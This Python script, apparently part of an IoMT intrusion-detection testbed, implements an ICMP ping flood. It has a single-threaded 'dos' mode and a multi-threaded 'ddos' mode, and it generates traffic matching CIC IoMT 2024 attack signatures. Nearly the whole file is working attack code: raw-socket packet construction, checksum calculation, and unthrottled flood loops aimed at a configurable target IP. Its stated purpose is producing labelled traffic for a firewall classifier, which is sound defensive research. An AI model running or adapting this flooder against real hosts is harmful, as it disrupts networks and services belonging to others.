"""
icmp_flood_client.py — ICMP echo-request (ping) flood attack.

Sends a continuous stream of ICMP Echo Request packets using a raw socket,
generating the TCP_IP-DoS-ICMP (serial) and TCP_IP-DDoS-ICMP1/2 (parallel)
signatures from the CIC IoMT 2024 dataset.

Requires root (raw socket):
  sudo python attack_clients/icmp_flood_client.py

Note: The default firewall iptables rules capture only TCP on port 1883.
To have the firewall classify these packets add:
  sudo iptables -I INPUT  -p icmp -j NFQUEUE --queue-num 0
  sudo iptables -I OUTPUT -p icmp -j NFQUEUE --queue-num 0

Two modes:
  --mode dos    Single thread (TCP_IP-DoS-ICMP).
  --mode ddos   Many threads concurrently (TCP_IP-DDoS-ICMP1/2).

Environment variables:
  ICMP_FLOOD_TARGET     Destination IP (default: GATEWAY_IP)
  ICMP_FLOOD_THREADS    Threads for ddos mode (default: 10)
  ICMP_FLOOD_PAYLOAD    Payload size in bytes (default: 56)
  ATTACK_RATE_HZ        Packets per second per thread (0 = max, default: 0)
  ATTACK_BURST_COUNT    Stop after N total packets (0 = infinite, default: 0)
  GATEWAY_IP
"""

from __future__ import annotations

import os
import socket
import struct
import sys
import threading
import time
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP    = os.getenv("GATEWAY_IP", "127.0.0.1")
TARGET_IP     = os.getenv("ICMP_FLOOD_TARGET", GATEWAY_IP)
NUM_THREADS   = int(os.getenv("ICMP_FLOOD_THREADS", "10"))
PAYLOAD_BYTES = int(os.getenv("ICMP_FLOOD_PAYLOAD", "56"))
RATE_HZ       = float(os.getenv("ATTACK_RATE_HZ", "0"))
BURST_COUNT   = int(os.getenv("ATTACK_BURST_COUNT", "0"))

_total_lock = threading.Lock()
_total_sent = 0
_stop_event = threading.Event()


def _icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_icmp_echo(seq: int) -> bytes:
    icmp_type = 8    # Echo Request
    icmp_code = 0
    identifier = os.getpid() & 0xFFFF
    payload = b"A" * PAYLOAD_BYTES
    header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, identifier, seq & 0xFFFF)
    chk = _icmp_checksum(header + payload)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, chk, identifier, seq & 0xFFFF)
    return header + payload


def _flood_loop(thread_id: int) -> None:
    global _total_sent
    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[ICMP-FLOOD] ERROR: raw socket requires root. Run with sudo.", file=sys.stderr)
        _stop_event.set()
        return

    seq = thread_id * 10000
    try:
        while not _stop_event.is_set():
            pkt = _build_icmp_echo(seq)
            try:
                sock.sendto(pkt, (TARGET_IP, 0))
            except OSError:
                time.sleep(0.01)
                continue

            seq += 1
            with _total_lock:
                _total_sent += 1
                n = _total_sent

            if n % 1000 == 0:
                print(f"[ICMP-FLOOD] thread={thread_id:03d}  total_sent={n}")

            if BURST_COUNT > 0 and n >= BURST_COUNT:
                _stop_event.set()
                break

            if sleep_s:
                time.sleep(sleep_s)
    finally:
        sock.close()


def run_dos() -> None:
    print(f"[ICMP-FLOOD] Mode: dos (TCP_IP-DoS-ICMP)  target: {TARGET_IP}  "
          f"payload: {PAYLOAD_BYTES}B")
    try:
        _flood_loop(0)
    except KeyboardInterrupt:
        _stop_event.set()
    print(f"[ICMP-FLOOD] Done. Total packets: {_total_sent}")


def run_ddos() -> None:
    print(f"[ICMP-FLOOD] Mode: ddos (TCP_IP-DDoS-ICMP)  threads: {NUM_THREADS}  "
          f"target: {TARGET_IP}  payload: {PAYLOAD_BYTES}B")
    threads = [
        threading.Thread(target=_flood_loop, args=(i,), daemon=True)
        for i in range(NUM_THREADS)
    ]
    try:
        for t in threads:
            t.start()
        while not _stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        _stop_event.set()

    for t in threads:
        t.join(timeout=2)
    print(f"[ICMP-FLOOD] Done. Total packets: {_total_sent}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ICMP flood attack (requires root)")
    parser.add_argument("--mode", choices=["dos", "ddos"], default="dos",
                        help="dos: single thread | ddos: multi-thread (default: dos)")
    args = parser.parse_args()

    if args.mode == "ddos":
        run_ddos()
    else:
        run_dos()
